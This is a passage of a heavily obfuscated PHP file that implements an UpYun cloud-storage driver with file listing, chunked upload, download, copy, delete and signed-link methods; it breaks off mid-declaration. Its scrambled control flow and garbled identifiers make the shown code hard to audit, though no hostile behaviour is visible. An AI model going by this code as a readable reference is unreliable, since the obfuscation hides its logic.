<?php
 goto c¬Úƒƒ‡‘Ü; EÕ«°¡Ë‰¦: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\x3a\57\x2f\x76\x30\56\x61\x70\151\x2e\165\x70\171\x75\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dğ´·ƒ) { parent::__construct(); $this->_init($dğ´·ƒ); } public function _init($a”—«¯ÊµÎ) { foreach ($a”—«¯ÊµÎ as $dË‡‘‹æ½ô => $aÑåªøÉô) { if (isset($this->{$dË‡‘‹æ½ô})) { $this->{$dË‡‘‹æ½ô} = $aÑåªøÉô; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[»„][1221], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($A•ŠĞšêƒó, $dÅÍ™®Òå = "\x47\105\124") { $e¿—êÃšÃä =& $_SERVER[»„]; $F¸ÒÅ«É´á = gmdate($e¿—êÃšÃä[1185]); $eŸ†¦»¹¯õ = base64_encode(hash_hmac($e¿—êÃšÃä[1222], "{$dÅÍ™®Òå}\46{$A•ŠĞšêƒó}\x26{$F¸ÒÅ«É´á}", md5("{$this->userpass}"), !0)); $A“„«ËàõÑ = array("\101\165\164\x68\x6f\162\x69\x7a\x61\x74\151\x6f\x6e\72\x55\x50\x59\x55\116\40{$this->username}\x3a{$eŸ†¦»¹¯õ}", "\x44\x61\x74\x65\72{$F¸ÒÅ«É´á}"); return $A“„«ËàõÑ; } public function ussRequest($CóîïÏóÔÑ, $dóÍà‡ˆÀ = "\107\x45\124", $eášì„ò¿µ = false, $C¨èøêÉ¹• = false, $C¶¹‘öÉ’Ñ = false) { goto Aæ³æ¿å¯; Aæ³æ¿å¯: $E÷¡Á†­÷ =& $_SERVER[»„]; $CóîïÏóÔÑ = trim($CóîïÏóÔÑ, $E÷¡Á†­÷[8]); $FÜœ·“˜´ = "\57{$this->bucket}\57{$CóîïÏóÔÑ}"; goto eÉ½ß‹åâ; eÉ½ß‹åâ: $F¹²Ïë§µ = $this->ussHeaders($FÜœ·“˜´, $dóÍà‡ˆÀ); if ($C¨èøêÉ¹•) { $F¹²Ïë§µ = array_merge($F¹²Ïë§µ, $C¨èøêÉ¹•); } $Aİ³ïæœ°Å = url_request($this->endpoint . $FÜœ·“˜´, $dóÍà‡ˆÀ, $eášì„ò¿µ, $F¹²Ïë§µ, $C¶¹‘öÉ’Ñ); goto a¦„Û‹ëŸ¯; a¦„Û‹ëŸ¯: if (!$Aİ³ïæœ°Å) { return array($E÷¡Á†­÷[1020] => !1, $E÷¡Á†­÷[1022] => $E÷¡Á†­÷[1223]); } if (strtolower($dóÍà‡ˆÀ) == $E÷¡Á†­÷[180] || in_array($Aİ³ïæœ°Å[$E÷¡Á†­÷[1020]], array($E÷¡Á†­÷[1081], $E÷¡Á†­÷[1224]))) { $eášì„ò¿µ = $Aİ³ïæœ°Å[$E÷¡Á†­÷[1225]]; } else { $eášì„ò¿µ = json_decode($Aİ³ïæœ°Å[$E÷¡Á†­÷[1022]], !0); if (!$eášì„ò¿µ) { $eášì„ò¿µ = $Aİ³ïæœ°Å[$E÷¡Á†­÷[1022]]; } else { if (!$Aİ³ïæœ°Å[$E÷¡Á†­÷[677]] && isset($eášì„ò¿µ[$E÷¡Á†­÷[1226]])) { $eášì„ò¿µ = $eášì„ò¿µ[$E÷¡Á†­÷[1226]]; } } } return array($E÷¡Á†­÷[1020] => $Aİ³ïæœ°Å[$E÷¡Á†­÷[677]], $E÷¡Á†­÷[1022] => $eášì„ò¿µ); goto dÕ†ÇĞšÖ¸; dÕ†ÇĞšÖ¸: } public function mkfile($fåŸ­–ÌÆ™, $CôéÓÃù¶‚ = '', $AØÎÙğâœÉ = REPEAT_RENAME) { if ($this->setContent($fåŸ­–ÌÆ™, $CôéÓÃù¶‚)) { return $this->getPathOuter($fåŸ­–ÌÆ™); } return !1; } public function mkdir($AèÌ±˜‹, $fÔŒÇ›íó½ = REPEAT_SKIP) { $cœéÎÚâ‡ =& $_SERVER[»„]; $B­Ïß±‹‘‰ = trim($AèÌ±˜‹, $cœéÎÚâ‡[8]); if ($this->_isFolder($B­Ïß±‹‘‰)) { return $this->getPathOuter($B­Ïß±‹‘‰); } $AÕ“ÆÃªì¦ = array($cœéÎÚâ‡[1227]); $F»Ÿ„äÖó = $this->ussRequest($B­Ïß±‹‘‰, $cœéÎÚâ‡[208], !1, $AÕ“ÆÃªì¦); return $F»Ÿ„äÖó[$cœéÎÚâ‡[1020]] ? $this->getPathOuter($B­Ïß±‹‘‰) : !1; } public function copyFile($eÚ­ñÉñ¾, $aòáºƒ£Ô) { $d¬©¶ÄŸ¢« =& $_SERVER[»„]; $DĞÀ‘ ¾å = array($d¬©¶ÄŸ¢«[1228] . "\x2f{$this->bucket}\57{$eÚ­ñÉñ¾}", $d¬©¶ÄŸ¢«[1229]); $f¾ÓÌƒ×ŒÉ = $this->ussRequest($aòáºƒ£Ô, $d¬©¶ÄŸ¢«[210], !1, $DĞÀ‘ ¾å); return $f¾ÓÌƒ×ŒÉ[$d¬©¶ÄŸ¢«[1020]] ? !0 : !1; } public function moveFile($Aõ…ÉÎ…ğˆ, $cÔÇ¹îÊîŸ) { $Aï¬æœÉÃî =& $_SERVER[»„]; $dÄ„¸¼Ô¨æ = array($Aï¬æœÉÃî[1230] . "\x2f{$this->bucket}\x2f{$Aõ…ÉÎ…ğˆ}", $Aï¬æœÉÃî[1229]); $D…ÉÀ›«Ò¾ = $this->ussRequest($cÔÇ¹îÊîŸ, $Aï¬æœÉÃî[210], !1, $dÄ„¸¼Ô¨æ); return $D…ÉÀ›«Ò¾[$Aï¬æœÉÃî[1020]] ? !0 : !1; } public function delFile($a‰½ôÉ) { $e‚´Íœ†ìŠ =& $_SERVER[»„]; $aÂÀ™¡…ö´ = $this->ussRequest($a‰½ôÉ, $e‚´Íœ†ìŠ[1231]); return $aÂÀ™¡…ö´[$e‚´Íœ†ìŠ[1020]] ? !0 : !1; } public function delFolder($CÜ¸¤×“—) { $f­‹¥¿§®º =& $_SERVER[»„]; $a»¿“Æ‰• = $this->listAll($CÜ¸¤×“—); krsort($a»¿“Æ‰•); foreach ($a»¿“Æ‰• as $eÅÃ„šÊ­¢) { $this->ussRequest($eÅÃ„šÊ­¢[$f­‹¥¿§®º[75]], $f­‹¥¿§®º[1231]); } return $this->ussRequest($CÜ¸¤×“—, $f­‹¥¿§®º[1231]); } public function rename($eøå÷·÷œï, $cŒ²—ä©) { if ($this->isFile($eøå÷·÷œï)) { $cŒ²—ä© = get_path_father($eøå÷·÷œï) . $cŒ²—ä©; return $this->moveFile($eøå÷·÷œï, $cŒ²—ä©); } return $this->renameObject($eøå÷·÷œï, $cŒ²—ä©); } public function fileInfo($f¹Ç÷¬½Ëœ, $A½ƒ½•šš» = false, $e•Àõö–‡ = array()) { $F ğÏéœÜ =& $_SERVER[»„]; if ($A½ƒ½•šš») { return array($F ğÏéœÜ[28] => $this->pathThis($f¹Ç÷¬½Ëœ), $F ğÏéœÜ[75] => $this->getPathOuter($F ğÏéœÜ[8] . $f¹Ç÷¬½Ëœ), $F ğÏéœÜ[29] => $F ğÏéœÜ[163], $F ğÏéœÜ[77] => isset($e•Àõö–‡[$F ğÏéœÜ[321]]) ? $e•Àõö–‡[$F ğÏéœÜ[321]] : 0, $F ğÏéœÜ[156] => $this->ext($f¹Ç÷¬½Ëœ)); } $A®É¤±ƒ»³ = array($F ğÏéœÜ[28] => $this->pathThis($f¹Ç÷¬½Ëœ), $F ğÏéœÜ[75] => $this->getPathOuter($F ğÏéœÜ[8] . $f¹Ç÷¬½Ëœ), $F ğÏéœÜ[29] => $F ğÏéœÜ[163], $F ğÏéœÜ[183] => 0, $F ğÏéœÜ[106] => isset($eˆÏå²Øâ‘[$F ğÏéœÜ[1232]]) ? $eˆÏå²Øâ‘[$F ğÏéœÜ[1232]] : 0, $F ğÏéœÜ[77] => isset($e•Àõö–‡[$F ğÏéœÜ[321]]) ? $e•Àõö–‡[$F ğÏéœÜ[321]] : 0, $F ğÏéœÜ[156] => $this->ext($f¹Ç÷¬½Ëœ), $F ğÏéœÜ[184] => !0, $F ğÏéœÜ[185] => !0); if (empty($e•Àõö–‡)) { $e•Àõö–‡ = $this->objectMeta($f¹Ç÷¬½Ëœ); if (!$e•Àõö–‡) { return $A®É¤±ƒ»³; } $A®É¤±ƒ»³[$F ğÏéœÜ[183]] = $e•Àõö–‡[$F ğÏéœÜ[1233]]; $A®É¤±ƒ»³[$F ğÏéœÜ[106]] = $e•Àõö–‡[$F ğÏéœÜ[1234]]; $A®É¤±ƒ»³[$F ğÏéœÜ[77]] = $e•Àõö–‡[$F ğÏéœÜ[77]]; } return $A®É¤±ƒ»³; } public function folderInfo($c§¯ß›íÆ¿, $AÉïá¡İà‘ = false) { $BÅÅ•öƒÉ¯ =& $_SERVER[»„]; if ($AÉïá¡İà‘) { return array($BÅÅ•öƒÉ¯[28] => $this->pathThis($c§¯ß›íÆ¿), $BÅÅ•öƒÉ¯[75] => $this->getPathOuter($BÅÅ•öƒÉ¯[8] . $c§¯ß›íÆ¿), $BÅÅ•öƒÉ¯[29] => $BÅÅ•öƒÉ¯[76]); } $aÂ÷Í¥¤‘ß = array($BÅÅ•öƒÉ¯[28] => $this->pathThis($c§¯ß›íÆ¿), $BÅÅ•öƒÉ¯[75] => $this->getPathOuter($BÅÅ•öƒÉ¯[8] . $c§¯ß›íÆ¿), $BÅÅ•öƒÉ¯[29] => $BÅÅ•öƒÉ¯[76], $BÅÅ•öƒÉ¯[183] => 0, $BÅÅ•öƒÉ¯[106] => isset($bö½ø‚¢Ğ[$BÅÅ•öƒÉ¯[1232]]) ? $bö½ø‚¢Ğ[$BÅÅ•öƒÉ¯[1232]] : 0, $BÅÅ•öƒÉ¯[1142] => !0, $BÅÅ•öƒÉ¯[1143] => !0); if (empty($Ağ…ùäô•)) { $Ağ…ùäô• = $this->objectMeta($c§¯ß›íÆ¿); if (!$Ağ…ùäô•) { return $aÂ÷Í¥¤‘ß; } $aÂ÷Í¥¤‘ß[$BÅÅ•öƒÉ¯[183]] = $Ağ…ùäô•[$BÅÅ•öƒÉ¯[1233]]; $aÂ÷Í¥¤‘ß[$BÅÅ•öƒÉ¯[106]] = $Ağ…ùäô•[$BÅÅ•öƒÉ¯[1234]]; } return $aÂ÷Í¥¤‘ß; } private function fileList($EŸöáƒ—ø‹, $EÏÏĞâˆæ = 0, $B¦šö©İ = 1000) { $dŠ–èïà‘Õ =& $_SERVER[»„]; $B±´„ö… = array($dŠ–èïà‘Õ[1235], $dŠ–èïà‘Õ[1236] . $B¦šö©İ); if ($EÏÏĞâˆæ) { $B±´„ö…[] = $dŠ–èïà‘Õ[1237] . $EÏÏĞâˆæ; } $aÇä™ŸÂÚé = $this->ussRequest($EŸöáƒ—ø‹, $dŠ–èïà‘Õ[212], !1, $B±´„ö…); return !$aÇä™ŸÂÚé[$dŠ–èïà‘Õ[1020]] ? !1 : $aÇä™ŸÂÚé[$dŠ–èïà‘Õ[1022]]; } public function listPath($eåÉî‡ôÔÃ, $aË³Îï‘Ç = false) { goto aïæšªŠº; Eö‚î³Ì¥Í: return array($BØÈØÛ‘×[74] => $d¡¼ìŠí ˜, $BØÈØÛ‘×[73] => $C‚ÆŸ¸ŸÃì); goto AåÓƒÜèÃŠ; f¿¹ğ«¦Ú÷: $d¡¼ìŠí ˜ = $C‚ÆŸ¸ŸÃì = array(); $f‹¥ ‡‚±Œ = rtrim($eåÉî‡ôÔÃ, $BØÈØÛ‘×[8]) . $BØÈØÛ‘×[8]; while (!0) { $dè÷£ÒŒ¶ = $this->fileList($eåÉî‡ôÔÃ, $BÌ÷‰ˆ¥‡“, $E¹ğªÌ³‘Ğ); if (!$dè÷£ÒŒ¶) { return !1; } $BÌ÷‰ˆ¥‡“ = isset($dè÷£ÒŒ¶[$BØÈØÛ‘×[1238]]) ? $dè÷£ÒŒ¶[$BØÈØÛ‘×[1238]] : $BØÈØÛ‘×[33]; $D‡Ïª¯‘øŞ = isset($dè÷£ÒŒ¶[$BØÈØÛ‘×[1239]]) ? $dè÷£ÒŒ¶[$BØÈØÛ‘×[1239]] : array(); foreach ($D‡Ïª¯‘øŞ as $FÒš÷ğê£½) { if ($FÒš÷ğê£½[$BØÈØÛ‘×[29]] == $BØÈØÛ‘×[76]) { $d¡¼ìŠí ˜[] = $this->folderInfo($f‹¥ ‡‚±Œ . $FÒš÷ğê£½[$BØÈØÛ‘×[28]], $aË³Îï‘Ç, $FÒš÷ğê£½); } else { $C‚ÆŸ¸ŸÃì[] = $this->fileInfo($f‹¥ ‡‚±Œ . $FÒš÷ğê£½[$BØÈØÛ‘×[28]], $aË³Îï‘Ç, $FÒš÷ğê£½); } } if (count($D‡Ïª¯‘øŞ) < $E¹ğªÌ³‘Ğ) { break; } } goto Eö‚î³Ì¥Í; aïæšªŠº: $BØÈØÛ‘× =& $_SERVER[»„]; $BÌ÷‰ˆ¥‡“ = $BØÈØÛ‘×[33]; $E¹ğªÌ³‘Ğ = 1000; goto f¿¹ğ«¦Ú÷; AåÓƒÜèÃŠ: } private function recursionAllFiles($CÔÉÄèñ„ì, &$bâìÖÛØ¯´) { $bî²½½ŸĞ’ =& $_SERVER[»„]; $F†Î„µŞ‰Ä = $bî²½½ŸĞ’[33]; $E“‡ŠëˆÌ = 1000; $A«›Õñ÷ƒ“ = $b‰Ø÷Í‘Î§ = array(); $F‚Âëì‡åÈ = rtrim($CÔÉÄèñ„ì, $bî²½½ŸĞ’[8]) . $bî²½½ŸĞ’[8]; while (!0) { $cˆë¡×ù¦ = $this->fileList($CÔÉÄèñ„ì, $F†Î„µŞ‰Ä, $E“‡ŠëˆÌ); if (!$cˆë¡×ù¦) { return !1; } $F†Î„µŞ‰Ä = isset($cˆë¡×ù¦[$bî²½½ŸĞ’[1238]]) ? $cˆë¡×ù¦[$bî²½½ŸĞ’[1238]] : $bî²½½ŸĞ’[33]; $CáÛ‡„İã„ = isset($cˆë¡×ù¦[$bî²½½ŸĞ’[1239]]) ? $cˆë¡×ù¦[$bî²½½ŸĞ’[1239]] : array(); foreach ($CáÛ‡„İã„ as $Fêã –…êÕ) { $Dƒâ²å¿ÈÁ = array($bî²½½ŸĞ’[75] => $F‚Âëì‡åÈ . $Fêã –…êÕ[$bî²½½ŸĞ’[28]], $bî²½½ŸĞ’[76] => $Fêã –…êÕ[$bî²½½ŸĞ’[29]] == $bî²½½ŸĞ’[76] ? 1 : 0, $bî²½½ŸĞ’[77] => isset($Fêã –…êÕ[$bî²½½ŸĞ’[321]]) ? $Fêã –…êÕ[$bî²½½ŸĞ’[321]] : 0); $bâìÖÛØ¯´[] = $Dƒâ²å¿ÈÁ; if ($Dƒâ²å¿ÈÁ[$bî²½½ŸĞ’[76]] == 1) { $this->recursionAllFiles($Dƒâ²å¿ÈÁ[$bî²½½ŸĞ’[75]], $bâìÖÛØ¯´); } } if (count($CáÛ‡„İã„) < $E“‡ŠëˆÌ) { break; } } } public function has($b°ŞÒš±¸Ç, $B‘Ş‰á–ğ = false, $C¹’¦ØºÚ = true) { goto dÑ·º”ôÈö; eğÒ„Âö½¢: while (!0) { $F‚¹Á–æ– = $this->fileList($b°ŞÒš±¸Ç, $B¡§ó“‡˜¥, $FéƒÎÊÇÖò); if (!$F‚¹Á–æ–) { return !1; } $B¡§ó“‡˜¥ = isset($F‚¹Á–æ–[$e¹ÓÜÊ·ø[1238]]) ? $F‚¹Á–æ–[$e¹ÓÜÊ·ø[1238]] : $e¹ÓÜÊ·ø[33]; $Dì›Ô×âŠ = isset($F‚¹Á–æ–[$e¹ÓÜÊ·ø[1239]]) ? $F‚¹Á–æ–[$e¹ÓÜÊ·ø[1239]] : array(); if (empty($Dì›Ô×âŠ)) { break; } $c ËöŸã…´ = array_to_keyvalue($Dì›Ô×âŠ, $e¹ÓÜÊ·ø[33], $e¹ÓÜÊ·ø[29]); $c•—¯Ô³ã¸ = array_count_values($c ËöŸã…´); $DîÜ¥½…ë = isset($c•—¯Ô³ã¸[$e¹ÓÜÊ·ø[76]]) ? $c•—¯Ô³ã¸[$e¹ÓÜÊ·ø[76]] : 0; $B¼–ÅŒ¾Ö = count($c ËöŸã…´) - $DîÜ¥½…ë; if ($B‘Ş‰á–ğ) { $Aê¥ô™ÑÑì += $DîÜ¥½…ë; $Dâ«êÏƒ¸µ += $B¼–ÅŒ¾Ö; if ($a×¸–¾‘ñ® < $FéƒÎÊÇÖò) { break; } continue; } if ($C¹’¦ØºÚ) { if ($B¼–ÅŒ¾Ö) { return !0; } } else { if ($DîÜ¥½…ë) { return !0; } } if (count($Dì›Ô×âŠ) < $FéƒÎÊÇÖò) { break; } } if ($B‘Ş‰á–ğ) { return array($e¹ÓÜÊ·ø[187] => $Dâ«êÏƒ¸µ, $e¹ÓÜÊ·ø[188] => $Aê¥ô™ÑÑì); } return !1; goto d“ƒ¦ùì•å; dÑ·º”ôÈö: $e¹ÓÜÊ·ø =& $_SERVER[»„]; $B¡§ó“‡˜¥ = $e¹ÓÜÊ·ø[33]; $FéƒÎÊÇÖò = 1000; goto e¢…²Â´ä; e¢…²Â´ä: $Dâ«êÏƒ¸µ = 0; $Aê¥ô™ÑÑì = 0; $fÀªÂó‘¼¥ = rtrim($b°ŞÒš±¸Ç, $e¹ÓÜÊ·ø[8]) . $e¹ÓÜÊ·ø[8]; goto eğÒ„Âö½¢; d“ƒ¦ùì•å: } public function listAll($cŠ«“®í´) { $BÛ„ã˜¥‡ = array(); $this->recursionAllFiles($cŠ«“®í´, $BÛ„ã˜¥‡); return $BÛ„ã˜¥‡; } public function canRead($bÈá¿ÏÅ˜Ä) { return $this->exist($bÈá¿ÏÅ˜Ä) ? !0 : !1; } public function canWrite($d²À¾¨¨Š) { return $this->exist($d²À¾¨¨Š) ? !0 : !1; } public function getContent($F÷½™çÌ†ğ) { return $this->fileSubstr($F÷½™çÌ†ğ, 0, -1); } public function setContent($BÃŠµŸ…¥Ã, $EÏÁù© = '') { $dóÃ‹Á¾ÚÖ =& $_SERVER[»„]; if (!$EÏÁù©) { $C„ÓÜ¢­îé = $this->ussRequest($BÃŠµŸ…¥Ã, $dóÃ‹Á¾ÚÖ[208]); return $C„ÓÜ¢­îé[$dóÃ‹Á¾ÚÖ[1020]]; } $eßÎ¾Şá‹› = $this->tempFile($this->pathThis($BÃŠµŸ…¥Ã)); file_put_contents($eßÎ¾Şá‹›, $EÏÁù©); if ($this->upload($BÃŠµŸ…¥Ã, $eßÎ¾Şá‹›)) { $this->tempFileRemve($eßÎ¾Şá‹›); return !0; } return !1; } public function fileSubstr($f»Ú“ ±Ø, $DœËÖ²öÔ, $dÂôìÂË«ï) { $b“÷İ¨ğ‰é =& $_SERVER[»„]; if (!($d÷œöÚ¨¨ = $this->link($f»Ú“ ±Ø))) { return !1; } $DÎƒæ¤Ëä = !1; if ($dÂôìÂË«ï > 0) { $DÒáÃ¿™­„ = $DœËÖ²öÔ + $dÂôìÂË«ï - 1; $DÎƒæ¤Ëä = array($b“÷İ¨ğ‰é[1200] . $DœËÖ²öÔ . $b“÷İ¨ğ‰é[408] . $DÒáÃ¿™­„); } $Fî‚æ‘èªÚ = url_request($d÷œöÚ¨¨, $b“÷İ¨ğ‰é[212], !1, $DÎƒæ¤Ëä); return $Fî‚æ‘èªÚ[$b“÷İ¨ğ‰é[677]] ? $Fî‚æ‘èªÚ[$b“÷İ¨ğ‰é[1022]] : !1; } public function upload($a³°Èáè–Ö, $eğ‚”ö‚·«, $c„ùª¢›Ö® = false, $B»àÖ¶ŸÂî = REPEAT_REPLACE) { goto cãé¼ŠÏ â; fæ—øëò¸ˆ: if (!$B©Èßßî¤«[$cƒ‘Ñ‡÷Íñ[1020]]) { return !1; } $F•¬Í¼Ëä = $B©Èßßî¤«[$cƒ‘Ñ‡÷Íñ[1022]]; $eÕÈŠÆ¨¹ = 0; goto dÖ‘ õÆ«; c£ÂÃ™öÖÃ: $B©Èßßî¤« = $this->ussRequest($a³°Èáè–Ö, $cƒ‘Ñ‡÷Íñ[210], !1, $a†‡È­ç…); return $B©Èßßî¤«[$cƒ‘Ñ‡÷Íñ[1020]] ? $this->getPathOuter($d À æ»­) : !1; goto C»–ÊÜÖÜ½; cãé¼ŠÏ â: $cƒ‘Ñ‡÷Íñ =& $_SERVER[»„]; $DĞ“°×âøÚ = IO::size($eğ‚”ö‚·«); if ($DĞ“°×âøÚ <= 1024 * 1024 * 200) { $aÂ¡å…à = array($cƒ‘Ñ‡÷Íñ[1240] . $eğ‚”ö‚·«); $B©Èßßî¤« = $this->ussRequest($a³°Èáè–Ö, $cƒ‘Ñ‡÷Íñ[210], $aÂ¡å…à); return $B©Èßßî¤«[$cƒ‘Ñ‡÷Íñ[1020]] ? $this->getPathOuter($a³°Èáè–Ö) : !1; } goto f»¯œåÈ¨æ; f»¯œåÈ¨æ: $Dàéç‚ÙØù = 1024 * 1024 * 10; $a†‡È­ç… = array($cƒ‘Ñ‡÷Íñ[1241], $cƒ‘Ñ‡÷Íñ[1242] . $DĞ“°×âøÚ, $cƒ‘Ñ‡÷Íñ[1243], $cƒ‘Ñ‡÷Íñ[1244] . $Dàéç‚ÙØù); $B©Èßßî¤« = $this->ussRequest($a³°Èáè–Ö, $cƒ‘Ñ‡÷Íñ[210], !1, $a†‡È­ç…); goto fæ—øëò¸ˆ; AôÃó’“‡Æ: do { $EôİÈÁÁ” = $F•¬Í¼Ëä[$cƒ‘Ñ‡÷Íñ[1246]]; fseek($bÃ“²¢—¬Í, $eÕÈŠÆ¨¹); $dì»šÖˆÅ… = fread($bÃ“²¢—¬Í, $EôİÈÁÁ”); $F§Ûïù·Å = 0; do { $F§Ûïù·Å++; $F•¬Í¼Ëä = $this->uploadPart($a³°Èáè–Ö, $F•¬Í¼Ëä, $dì»šÖˆÅ…); } while (!$F•¬Í¼Ëä && $F§Ûïù·Å < 3); if (!$F•¬Í¼Ëä) { return !1; } $Bá¢É…Î÷Ã = $F•¬Í¼Ëä[$cƒ‘Ñ‡÷Íñ[1245]]; $eÕÈŠÆ¨¹ += $EôİÈÁÁ”; } while ($Bá¢É…Î÷Ã != -1); fclose($bÃ“²¢—¬Í); $a†‡È­ç… = array($cƒ‘Ñ‡÷Íñ[1247], $cƒ‘Ñ‡÷Íñ[1248] . $F•¬Í¼Ëä[$cƒ‘Ñ‡÷Íñ[1249]], $cƒ‘Ñ‡÷Íñ[1243]); goto c£ÂÃ™öÖÃ; dÖ‘ õÆ«: $Bá¢É…Î÷Ã = $F•¬Í¼Ëä[$cƒ‘Ñ‡÷Íñ[1245]]; $bÃ“²¢—¬Í = fopen($eğ‚”ö‚·«, $cƒ‘Ñ‡÷Íñ[1150]); if (!$bÃ“²¢—¬Í) { return !1; } goto AôÃó’“‡Æ; C»–ÊÜÖÜ½: } private function uploadPart($fŒ‡ƒ•÷“, $fğ´÷ê£Ïƒ, &$e‹«ÒÚŞ¤©) { $d½…¥†Ã¤¼ =& $_SERVER[»„]; $DÕç‹««Şœ = array($d½…¥†Ã¤¼[1250], $d½…¥†Ã¤¼[1248] . $fğ´÷ê£Ïƒ[$d½…¥†Ã¤¼[1249]], $d½…¥†Ã¤¼[1251] . $fğ´÷ê£Ïƒ[$d½…¥†Ã¤¼[1245]], $d½…¥†Ã¤¼[1252] . $fğ´÷ê£Ïƒ[$d½…¥†Ã¤¼[1246]]); $E­Ö‡¿ãÅ§ = $this->ussRequest($fŒ‡ƒ•÷“, $d½…¥†Ã¤¼[210], $e‹«ÒÚŞ¤©, $DÕç‹««Şœ); return !$E­Ö‡¿ãÅ§[$d½…¥†Ã¤¼[1020]] ? $E­Ö‡¿ãÅ§[$d½…¥†Ã¤¼[1020]] : $E­Ö‡¿ãÅ§[$d½…¥†Ã¤¼[1022]]; } public function uploadFormData($d•¦‹•Ê®, $BÊˆÍø‰Å = 3600) { return $this->uploadPolicy($d•¦‹•Ê®, $BÊˆÍø‰Å); } public function multiUploadFormData($eÄ¶¯Î¾¹Ä, $E¬ºÍõŸ = 3600) { $aË¤„ĞÊ”š =& $_SERVER[»„]; $B‡ÜŠ£ß˜ö = (int) $GLOBALS[$aË¤„ĞÊ”š[7]][$aË¤„ĞÊ”š[77]]; return $this->uploadPolicy($eÄ¶¯Î¾¹Ä, $E¬ºÍõŸ, $B‡ÜŠ£ß˜ö); } private function uploadPolicy($e°¾°İ“£–, $e‘áË³¿ì = 3600, $b›‘ì›Š¬‰ = 0) { goto D“™Á¾‰ä; BÒ®·†ƒğ: $e´¶»àÒèÀ = array($aÒ·áé’‚[1253] => $this->bucket, $aÒ·áé’‚[1254] => $e°¾°İ“£–, $aÒ·áé’‚[1255] => time() + $e‘áË³¿ì, $aÒ·áé’‚[1256] => $fÏ”»âÄ“¥); if ($b›‘ì›Š¬‰) { $e´¶»àÒèÀ[$aÒ·áé’‚[1171]] = $b›‘ì›Š¬‰; } $bÔŠÙĞ õÈ = base64_encode(json_encode($e´¶»àÒèÀ)); goto CÏİÙá‰ˆÔ; CÏİÙá‰ˆÔ: $D±âŠÔšÎñ = base64_encode(hash_hmac($aÒ·áé’‚[1222], "\120\x4f\123\124\x26{$BÛ‚¢‘øô}\x26{$fÏ”»âÄ“¥}\x26{$bÔŠÙĞ õÈ}", md5("{$this->userpass}"), !0)); $fÜ‹Ğ‘ˆĞ… = array($aÒ·áé’‚[1093] => $bÔŠÙĞ õÈ, $aÒ·áé’‚[1257] => "\125\x50\131\x55\116\40{$this->username}\72{$D±âŠÔšÎñ}", $aÒ·áé’‚[165] => $this->endpoint . $BÛ‚¢‘øô); return $fÜ‹Ğ‘ˆĞ…; goto f¦Œæ’Æ¢Š; D“™Á¾‰ä: $aÒ·áé’‚ =& $_SERVER[»„]; $BÛ‚¢‘øô = $aÒ·áé’‚[8] . $this->bucket; $fÏ”»âÄ“¥ = gmdate($aÒ·áé’‚[1185]); goto BÒ®·†ƒğ; f¦Œæ’Æ¢Š: } public function download($CŞâ†‚ùß, $a‰’„Îğ¸Ÿ) { goto e«Š»àÎ•Š; eÎìÈéËÎÌ: fclose($FŠ­ë–ÃÚí); return $a‰’„Îğ¸Ÿ; goto EÙèøÕÒœ¢; B‚À—Œå¯¸: $A¹îº…ĞÀ = 1024 * 200; $FŠ­ë–ÃÚí = fopen($a°£Ğİ…¯º, $_SERVER[»„][1206]); while (!0) { $fáÛÖØîİ = $this->fileSubstr($CŞâ†‚ùß, $Eãèâ•‹, $A¹îº…ĞÀ); if ($fáÛÖØîİ === !1) { return !1; } fwrite($FŠ­ë–ÃÚí, $fáÛÖØîİ); $Eãèâ•‹ += $A¹îº…ĞÀ; if (strlen($fáÛÖØîİ) < $A¹îº…ĞÀ) { break; } } goto eÎìÈéËÎÌ; e«Š»àÎ•Š: $a°£Ğİ…¯º = IO::getPathInner(IO::mkfile($a‰’„Îğ¸Ÿ)); if (!($dîäƒÒ“Ï = $this->link($CŞâ†‚ùß))) { return !1; } $Eãèâ•‹ = 0; goto B‚À—Œå¯¸; EÙèøÕÒœ¢: } public function link($FÉõİÈğ±¡, $e¸ÚĞ¯µ¿î = array()) { $a°Ïğ§†îª =& $_SERVER[»„]; $FÉõİÈğ±¡ = trim($FÉõİÈğ±¡, $a°Ïğ§†îª[8]); if (!empty($this->token)) { $DàÕ•‘Û•° = strtotime(date($a°Ïğ§†îª[1258])); $CÉ¦£’ ˆ³ = substr(md5($this->token . $a°Ïğ§†îª[268] . $DàÕ•‘Û•° . $a°Ïğ§†îª[1259] . $FÉõİÈğ±¡), 12, 8) . $DàÕ•‘Û•°; $e¸ÚĞ¯µ¿î[] = $a°Ïğ§†îª[1260] . $CÉ¦£’ ˆ³; } $b´Ôàç‚¼ = !empty($e¸ÚĞ¯µ¿î) ? $a°Ïğ§†îª[69] . implode($a°Ïğ§†îª[268], $e¸ÚĞ¯µ¿î) : $a°Ïğ§†îª[33]; return $this->getHost() . $a°Ïğ§†îª[8] . $FÉõİÈğ±¡ . $b´Ôàç‚¼; } public function fileOut($bô¶Ê¾†Ÿ, $eç…´¼§¤‡ = false, $cÖ£²ˆµˆ = false, $BÕÅù±óªÔ = '') { if (!$cÖ£²ˆµˆ) { $cÖ£²ˆµˆ = $this->pathThis($bô¶Ê¾†Ÿ); } $eÁæÄ®½µ = $eç…´¼§¤‡ ? array($_SERVER[»„][1261] . rawurlencode($cÖ£²ˆµˆ)) : array(); $DèÔÃÀÅ = $this->link($bô¶Ê¾†Ÿ, $eÁæÄ®½µ); $this->fileOutLink($DèÔÃÀÅ); } public function fileOutServer($Eˆâ†‰Øç, $BÓ›±ïŸŒ¯ = false, $eÓ”ä¾ß‹Æ = false, $a…£¥Ø¹« = '') { parent::fileOut($Eˆâ†‰Øç, $BÓ›±ïŸŒ¯, $eÓ”ä¾ß‹Æ, $a…£¥Ø¹«); } public function fileOutImage($Dİ¶Ø›ÜÚµ, $a•â³ö÷© = 250) { $a¶îãí““ö = $this->link($Dİ¶Ø›ÜÚµ . $_SERVER[»„][1262] . $a•â³ö÷©); $this->fileOutLink($a¶îãí““ö); } public function fileOutImageServer($B‘çš¡‚‘, $FØÛ¢•âî„ = 250) { parent::fileOutImage($B‘çš¡‚‘, $FØÛ¢•âî„); } public function hashMd5($b£²÷´‚È) { $eİ¸ŸŸ¡Š =& $_SERVER[»„]; $b´ØÊùº„ = $this->objectMeta($b£²÷´‚È); return isset($b´ØÊùº„[$eİ¸ŸŸ¡Š[192]]) ? $b´ØÊùº„[$eİ¸ŸŸ¡Š[192]] : !1; } public function 